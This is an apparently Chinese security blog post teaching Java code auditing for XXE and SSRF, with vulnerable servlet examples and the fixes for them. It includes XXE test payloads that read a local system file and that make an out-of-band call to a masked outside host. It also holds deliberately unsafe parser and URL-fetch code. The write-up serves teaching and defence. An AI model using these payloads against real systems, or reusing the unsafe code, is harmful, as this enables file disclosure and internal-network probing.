+<h6 id="2-命名实体（内部实体）"><a href="#2-命名实体（内部实体）" class="headerlink" title="2)命名实体（内部实体）"></a>2)命名实体（内部实体）</h6><p>内部实体又称为命名实体。命名实体可以说成是变量声明，命名实体只能声明在DTD或者XML文件开始部分（&lt;!DOCTYPE&gt;语句中）。<br>命名实体（或内部实体）语法：<br><figure class="highlight plain"><figcaption><span>实体名称 "实体的值">```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>&lt;!DOCTYPE root [<br>    &lt;!ENTITY x “First Param!”&gt;<br>    &lt;!ENTITY y “Second Param!”&gt;<br>]&gt;</p>
+<p><root><x>&x;</x><y>&y;</y></root><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">定义一个实体名称x 值为First Param!</span><br><span class="line">&amp;x;  引用实体x</span><br><span class="line"></span><br><span class="line">###### 3)外部普通实体 </span><br><span class="line">外部实体用于加载外部文件的内容。（显式XXE攻击主要利用外部普通实体）</span><br><span class="line">外部普通实体语法：</span><br><span class="line">```&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPe root [</span><br><span class="line">    &lt;!ENTITY outfile SYSTEM &quot;outfile.xml&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;outfile&gt;&amp;outfile;&lt;/outfile&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<h6 id="4-外部参数实体"><a href="#4-外部参数实体" class="headerlink" title="4)外部参数实体"></a>4)外部参数实体</h6><p>参数实体用于DTD和文档的内部子集中。与一般实体不同，是以字符（%）开始，以字符（;）结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。（Blind XXE攻击常利用参数实体进行数据回显）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % param1 &quot;Hello&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % param2 &quot; &quot;&gt;</span><br><span class="line">    &lt;!ENTITY % param3 &quot;World&quot;&gt;</span><br><span class="line">    &lt;!ENTITY dtd SYSTEM &quot;combine.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;content&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<p>combine.dtd中的内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY content &quot;%param1;%param2;%param3;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>上面combine.dtd中定义了一个基本实体，引用了3个参数实体：%param1;，%param2;，%param3;。<br>解析后<foo>…</foo>中的内容为Hello World。</p>
+<h4 id="0x03-XXE审计函数"><a href="#0x03-XXE审计函数" class="headerlink" title="0x03 XXE审计函数"></a>0x03 XXE审计函数</h4><p>XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可查看XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br><span class="line">…………</span><br></pre></td></tr></table></figure></p>
+<h4 id="0x04-常用测试POC"><a href="#0x04-常用测试POC" class="headerlink" title="0x04 常用测试POC"></a>0x04 常用测试POC</h4><h5 id="POC1-外部普通实体"><a href="#POC1-外部普通实体" class="headerlink" title="POC1-外部普通实体"></a>POC1-外部普通实体</h5><p>当有回显时，利用ftp协议来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lltest[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure></p>
+<h5 id="POC2-外部参数实体"><a href="#POC2-外部参数实体" class="headerlink" title="POC2-外部参数实体"></a>POC2-外部参数实体</h5><p>无回显时 利用http协议来发起请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[ </span><br><span class="line">&lt;!ENTITY % lltest SYSTEM &quot;http://***.***.***.***:7777/lltest_xxe666&quot;&gt;</span><br><span class="line">%lltest;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="0X05-XXE漏洞代码示例"><a href="#0X05-XXE漏洞代码示例" class="headerlink" title="0X05 XXE漏洞代码示例"></a>0X05 XXE漏洞代码示例</h4><p>解析XML的方法越来越多，常见有四种，即：DOM、DOM4J、JDOM 和SAX。下面以这四种为例展示XXE漏洞。</p>
+<h5 id="1-DOM-Read-XML"><a href="#1-DOM-Read-XML" class="headerlink" title="1) DOM Read XML"></a>1) DOM Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		</span><br><span class="line">       String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//DOM Read XML</span><br><span class="line">		DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();     </span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();					</span><br><span class="line">		Document doc = db.parse(request.getInputStream());</span><br><span class="line">		</span><br><span class="line">		String username = getValueByTagName(doc,&quot;username&quot;);</span><br><span class="line">		String password = getValueByTagName(doc,&quot;password&quot;);</span><br><span class="line">		if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; catch (ParserConfigurationException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125; catch (SAXException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125;</span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="2-DOM4J-Read-XML"><a href="#2-DOM4J-Read-XML" class="headerlink" title="2) DOM4J Read XML"></a>2) DOM4J Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		    </span><br><span class="line">       String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//DOM4J Read XML</span><br><span class="line">		SAXReader saxReader = new SAXReader();</span><br><span class="line">		Document document = saxReader.read(request.getInputStream());</span><br><span class="line">		 </span><br><span class="line">	    String username = getValueByTagName2(document,&quot;username&quot;);</span><br><span class="line">		String password = getValueByTagName2(document,&quot;password&quot;);</span><br><span class="line">		 </span><br><span class="line">		if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">		&#125;		 		 </span><br><span class="line">		</span><br><span class="line">	&#125; catch (DocumentException  e) &#123;</span><br><span class="line">		System.out.println(e.getMessage());</span><br><span class="line">	&#125; </span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="3-JDOM2-Read-XML"><a href="#3-JDOM2-Read-XML" class="headerlink" title="3) JDOM2 Read XML"></a>3) JDOM2 Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		       </span><br><span class="line">       String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//JDOM2 Read XML	</span><br><span class="line">		SAXBuilder builder = new SAXBuilder();	</span><br><span class="line">	    Document document = builder.build(request.getInputStream());</span><br><span class="line">		 </span><br><span class="line">	    String username = getValueByTagName3(document,&quot;username&quot;);</span><br><span class="line">		String password = getValueByTagName3(document,&quot;password&quot;);</span><br><span class="line">		 </span><br><span class="line">		if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">		&#125;</span><br><span class="line">		 </span><br><span class="line">	&#125; catch (JDOMException  e) &#123;</span><br><span class="line">		System.out.println(e.getMessage());</span><br><span class="line">	&#125; </span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="4-SAX-Read-XML"><a href="#4-SAX-Read-XML" class="headerlink" title="4) SAX Read XML"></a>4) SAX Read XML</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		</span><br><span class="line">	//https://blog.csdn.net/u011024652/article/details/51516220</span><br><span class="line">	String result=&quot;&quot;;</span><br><span class="line">	try &#123;</span><br><span class="line">		//SAX Read XML</span><br><span class="line">		SAXParserFactory factory  = SAXParserFactory.newInstance(); </span><br><span class="line">		SAXParser saxparser = factory.newSAXParser();  </span><br><span class="line">		SAXHandler handler = new SAXHandler();  </span><br><span class="line">		saxparser.parse(request.getInputStream(), handler);</span><br><span class="line">		//为简单，没有提取子元素中的数据，只要调用parse()解析xml就已经触发xxe漏洞了</span><br><span class="line">           //没有回显  blind xxe</span><br><span class="line">		 result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,1);</span><br><span class="line"></span><br><span class="line">	&#125; catch (ParserConfigurationException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125; catch (SAXException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">	&#125;</span><br><span class="line">	response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">	response.getWriter().append(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="0x06-XXE漏洞防御"><a href="#0x06-XXE漏洞防御" class="headerlink" title="0x06 XXE漏洞防御"></a>0x06 XXE漏洞防御</h5><p>使用XML解析器时需要设置其属性，禁用DTDs或者禁止使用外部实体。</p>
+<p>以上例中DOM - DocumentBuilderFactory为例，防御代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); //禁用DTDs (doctypes),几乎可以防御所有xml实体攻击</span><br><span class="line">//如果不能禁用DTDs,可以使用下两项，必须两项同时存在</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);      //防止外部普通实体POC 攻击</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);   //防止外部参数实体POC攻击</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180918232137-894680ae-bb56-1.png" alt=""><br>其它XML解析器的漏洞防御可参考<br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#Java</a></p>
+<p>上述XXE漏洞与防御完整示例代码 已上传Github  详见 <a href="https://github.com/pplsec/JavaVul/tree/master/MyXXE" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MyXXE</a></p>
+<h3 id="二、SSRF"><a href="#二、SSRF" class="headerlink" title="二、SSRF"></a>二、SSRF</h3><h4 id="0x01-SSRF漏洞简介"><a href="#0x01-SSRF漏洞简介" class="headerlink" title="0x01 SSRF漏洞简介"></a>0x01 SSRF漏洞简介</h4><p>SSRF(Server-Side Request Forge, 服务端请求伪造)，攻击者让服务端发起指定的请求，SSRF攻击的目标一般是从外网无法访问的内网系统。Java中的SSRF支持sun.net.<a href="http://www.protocol" target="_blank" rel="noopener">www.protocol</a> 里的所有协议:http，https，file，ftp，mailto，jar，netdoc。相对于php，在java中SSRF的利用局限较大，一般利用http协议来探测端口，利用file协议读取任意文件。</p>
+<h4 id="0x02-SSRF审计函数"><a href="#0x02-SSRF审计函数" class="headerlink" title="0x02 SSRF审计函数"></a>0x02 SSRF审计函数</h4><p>SSRF漏洞一般位于远程图片加载与下载、图片或文章收藏功能、URL分享、通过URL在线翻译、转码等功能点处。<br>代码审计时需要关注的发起HTTP请求的类及函数，部分如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HttpURLConnection. getInputStream</span><br><span class="line">URLConnection. getInputStream</span><br><span class="line">Request.Get. execute</span><br><span class="line">Request.Post. execute</span><br><span class="line">URL.openStream</span><br><span class="line">ImageIO.read</span><br><span class="line">OkHttpClient.newCall.execute</span><br><span class="line">HttpClients. execute</span><br><span class="line">HttpClient.execute</span><br><span class="line">……</span><br></pre></td></tr></table></figure></p>
+<h4 id="0x03-SSRF漏洞代码示例"><a href="#0x03-SSRF漏洞代码示例" class="headerlink" title="0x03 SSRF漏洞代码示例"></a>0x03 SSRF漏洞代码示例</h4><h5 id="1-HttpURLConnection"><a href="#1-HttpURLConnection" class="headerlink" title="1) HttpURLConnection"></a>1) HttpURLConnection</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> //HttpURLConnection ssrf vul</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line"> URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream())); //发起请求,触发漏洞</span><br><span class="line">String inputLine;</span><br><span class="line"> StringBuffer html = new StringBuffer(); </span><br><span class="line"></span><br><span class="line"> while ((inputLine = in.readLine()) != null) &#123;</span><br><span class="line">         html.append(inputLine);</span><br><span class="line">        &#125;        </span><br><span class="line"> System.out.println(&quot;html:&quot; + html.toString());</span><br><span class="line"> in.close();</span><br></pre></td></tr></table></figure>
+<h5 id="2-urlConnection"><a href="#2-urlConnection" class="headerlink" title="2) urlConnection"></a>2) urlConnection</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//urlConnection ssrf vul</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line">URLConnection urlConnection = u.openConnection();</span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //发起请求,触发漏洞</span><br><span class="line">String inputLine;</span><br><span class="line">StringBuffer html = new StringBuffer();</span><br><span class="line">while ((inputLine = in.readLine()) != null) &#123;</span><br><span class="line">     html.append(inputLine);</span><br><span class="line">&#125;        </span><br><span class="line">System.out.println(&quot;html:&quot; + html.toString());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure>
+<h5 id="3-ImageIO"><a href="#3-ImageIO" class="headerlink" title="3) ImageIO"></a>3) ImageIO</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ImageIO ssrf vul</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line">BufferedImage img = ImageIO.read(u); // 发起请求,触发漏洞</span><br></pre></td></tr></table></figure>
+<h5 id="4-其他"><a href="#4-其他" class="headerlink" title="4) 其他"></a>4) 其他</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// Request漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">return Request.Get(url).execute().returnContent().toString();//发起请求</span><br><span class="line"></span><br><span class="line">// openStream漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">URL u = new URL(url);</span><br><span class="line">inputStream = u.openStream();  //发起请求</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// OkHttpClient漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">OkHttpClient client = new OkHttpClient();</span><br><span class="line">com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">client.newCall(ok_http).execute();  //发起请求</span><br><span class="line"></span><br><span class="line">// HttpClients漏洞示例</span><br><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = new HttpGet(url);</span><br><span class="line">HttpResponse httpResponse = client.execute(httpGet); //发起请求</span><br></pre></td></tr></table></figure>
+<h4 id="0x04-SSRF漏洞防御"><a href="#0x04-SSRF漏洞防御" class="headerlink" title="0x04 SSRF漏洞防御"></a>0x04 SSRF漏洞防御</h4><p>1）限制协议为HTTP、HTTPS协议。<br>2）禁止30x跳转。<br>3）设置URL白名单或者限制内网IP。<br>4）限制请求的端口为http常用的端口。</p>
+<p>以上例中HttpURLConnection为例，防御代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">String url = request.getParameter(&quot;url&quot;);</span><br><span class="line">if (!SSRFHostCheck(url)) &#123;</span><br><span class="line">        System.out.println(&quot;warning!!! illegal url:&quot; + url);</span><br><span class="line">         return;</span><br><span class="line">&#125;    </span><br><span class="line">URL u = new URL(url);</span><br><span class="line"> </span><br><span class="line">URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">            </span><br><span class="line">httpUrl.setInstanceFollowRedirects(false); //禁止30x跳转</span><br><span class="line">            </span><br><span class="line">BufferedReader in = new BufferedReader(new InputStreamReader(httpUrl.getInputStream())); //send request</span><br><span class="line">……………………</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static Boolean SSRFHostCheck(String url) &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">	   URL u = new URL(url);</span><br><span class="line">	   // 限制为http和https协议</span><br><span class="line">           if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) &#123;</span><br><span class="line">           String uProtocol = u.getProtocol();</span><br><span class="line">           System.out.println(&quot;illegal Protocol:&quot; + uProtocol);</span><br><span class="line">           return  false;</span><br><span class="line">         &#125;</span><br><span class="line">           </span><br><span class="line">          // 获取域名或IP，并转为小写</span><br><span class="line">          String host = u.getHost().toLowerCase();</span><br><span class="line">          String hostwhitelist = &quot;192.168.199.209&quot;;     //白名单    </span><br><span class="line">          if (host.equals(hostwhitelist)) &#123;</span><br><span class="line">       	   System.out.println(&quot;ok_host:&quot; + host);</span><br><span class="line">       	   return true;</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">           	System.out.println(&quot;illegal host:&quot; + host);</span><br><span class="line">           	return false;</span><br><span class="line">          &#125;</span><br><span class="line">	    &#125; catch (Exception e) &#123;</span><br><span class="line">	        return false;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上述SSRF漏洞与防御完整示例代码 已上传Github  详见 <a href="https://github.com/pplsec/JavaVul/tree/master/MySSRF" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MySSRF</a></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/1633" target="_blank" rel="noopener">https://xz.aliyun.com/t/1633</a><br><a href="http://rickgray.me/2015/06/08/xml-entity-attack-review/" target="_blank" rel="noopener">http://rickgray.me/2015/06/08/xml-entity-attack-review/</a><br><a href="https://github.com/c0ny1/xxe-lab/blob/master/java_xxe/src/me/gv7/xxe/LoginServlet.java" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab/blob/master/java_xxe/src/me/gv7/xxe/LoginServlet.java</a><br><a href="https://joychou.org/java/javassrf.html" target="_blank" rel="noopener">https://joychou.org/java/javassrf.html</a><br><a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SSRF.java" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SSRF.java</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
